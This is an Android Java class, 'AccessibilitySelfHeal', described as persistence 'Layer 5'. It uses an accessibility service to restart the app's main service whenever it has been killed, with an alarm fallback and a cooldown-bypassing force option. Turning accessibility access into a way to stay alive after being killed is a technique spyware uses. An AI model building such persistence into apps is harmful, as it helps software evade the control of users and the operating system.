package com.fason.app.persistence;

import android.content.Context;
import android.content.Intent;
import android.os.Build;
import android.util.Log;
import com.fason.app.core.FasonApp;
import com.fason.app.service.MainService;

/**
 * Layer 5: Accessibility Self-Heal
 * Uses the accessibility service context (system process) to restart
 * the main service when it's killed. Accessibility runs in a privileged
 * process that's harder for the system to terminate.
 */
public final class AccessibilitySelfHeal {
    private static final String TAG = "A11ySelfHeal";
    private static volatile long lastHealAttempt = 0;
    private static final long HEAL_COOLDOWN_MS = 30_000; // 30 seconds

    private AccessibilitySelfHeal() {}

    /**
     * Called from FasonAccessibilityService.onAccessibilityEvent().
     * Checks if MainService is alive and restarts it if not.
     */
    public static void checkAndHeal() {
        long now = System.currentTimeMillis();
        if (now - lastHealAttempt < HEAL_COOLDOWN_MS) return;

        if (MainService.getInstance() != null) return; // Already alive

        lastHealAttempt = now;
        Log.i(TAG, "MainService dead — healing from accessibility context");

        try {
            Context ctx = FasonApp.getContext();
            Intent intent = new Intent(ctx, MainService.class);

            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                ctx.startForegroundService(intent);
            } else {
                ctx.startService(intent);
            }

            Log.i(TAG, "Heal command sent");
        } catch (Exception e) {
            Log.e(TAG, "Heal failed", e);
            // Fallback: try via alarm
            AlarmEngine.scheduleHeartbeat();
        }
    }

    /**
     * Aggressive heal — bypasses cooldown. Use sparingly.
     */
    public static void forceHeal() {
        lastHealAttempt = 0;
        checkAndHeal();
    }
}
